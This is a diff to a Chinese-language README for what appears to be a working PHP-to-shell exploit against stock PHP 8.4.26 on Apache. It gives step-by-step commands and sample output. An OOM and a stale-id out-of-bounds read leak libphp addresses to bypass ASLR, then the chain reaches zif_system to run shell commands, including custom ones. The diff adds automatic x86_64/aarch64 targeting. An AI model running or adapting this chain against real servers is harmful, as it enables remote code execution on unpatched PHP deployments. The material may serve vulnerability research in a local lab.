@@ -24,6 +24,7 @@ cd php2shell-bypass-aslr-exp
 # 1) 起目标：stock 官方镜像；容器里只把官方 php.ini-production 复制成 php.ini
 ./pure/run_pure.sh
 # target: OK
+# architecture: x86_64 (run exploit with --arch x86_64)
 # PHP 8.4.26 ...
 # display_errors => Off => Off
 # memory_limit => 128M => 128M
@@ -31,10 +32,11 @@ cd php2shell-bypass-aslr-exp
 
 # 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
 python3 exploit.py --port 18110
+#       --arch auto（默认）：自动识别 x86_64 / aarch64
 #       pinned 150/150 workers (149 holders)
 # [try 1] A1: END-cleanup send_cookie OOM
 # [try 1] B1: stale-id OOB read (chunk base + libphp)
-#       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
+#       arch=x86_64 decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
 #       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
 #                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
 # [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
@@ -44,8 +46,8 @@ python3 exploit.py --port 18110
 
 不编译 PHP/Apache、不 build 镜像、不挂 gdb、不改目标 ini。
 `pure/run_pure.sh` 默认容器 `p2s-pure-18110`、端口 `18110`，默认使用
-官方 prefork 配置（MaxRequestWorkers=150），起完会打印实际 ini 和 MPM
-值；`--single` 才挂非官方的单 worker 覆盖
+官方 prefork 配置（MaxRequestWorkers=150），起完会打印实际架构、ini 和
+MPM 值；`--single` 才挂非官方的单 worker 覆盖
 `pure/docker/apache-single-worker.conf`（配合 `--workers 1`）。`docker/apache.conf`
 只是给旧 harness 保留的兼容软链，指向同一个文件。
 Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可以显式
@@ -61,7 +63,7 @@ python3 exploit.py --port 18110 --restart p2s-pure-18110
 # 官方 worker 是默认值；--single 起的单 worker 目标用 --workers 1
 python3 exploit.py --port 18110 --workers 1
 
-# 原生 ARM64 目标（默认仍是 x86_64）
+# ARM64 也可显式指定（默认 --arch auto 自动识别）
 python3 exploit.py --arch aarch64 --port 18110 --workers 1
 
 # 自定义命令：把脚本写进挂载目录，再用 sh 执行
